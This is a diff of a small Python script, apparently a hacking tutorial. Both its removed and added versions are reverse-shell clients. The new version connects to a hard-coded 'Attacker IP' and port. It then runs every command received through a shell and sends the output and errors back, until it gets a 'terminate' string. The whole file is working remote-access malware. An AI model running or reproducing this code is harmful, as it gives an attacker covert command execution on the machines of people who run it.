@@ -1,23 +1,23 @@
-import socket
-import os
-import subprocess
+import socket # For Building TCP Connection
+import subprocess # To start the shell in the system
 
-target_host = ""
-target_port = 99
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' 
+    s.connect(('10.0.2.15', 8080)) # Here we define the Attacker IP and the listening port
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True: # keep receiving commands from the machine
+        command = s.recv(1024) # read the first KB of the tcp socket
 
-client.connect((target_host,target_port))
+        if 'terminate' in command: # if we got terminate order from the attacker, close the socket and break the loop
+            s.close()
+            break 
 
-while True:
-    data = client.recv(1024)
-    if data[:2].decode('utf-8') == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+        else: # otherwise, we pass the received command to a shell process
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
-        output_bytes = cmd.stdout.read()
-        output_str = str(output_bytes, "utf-8")
-        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send( CMD.stdout.read() ) # send back the result
+            s.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error
 
-client.close()
+def main ():
+    connect()
+main()
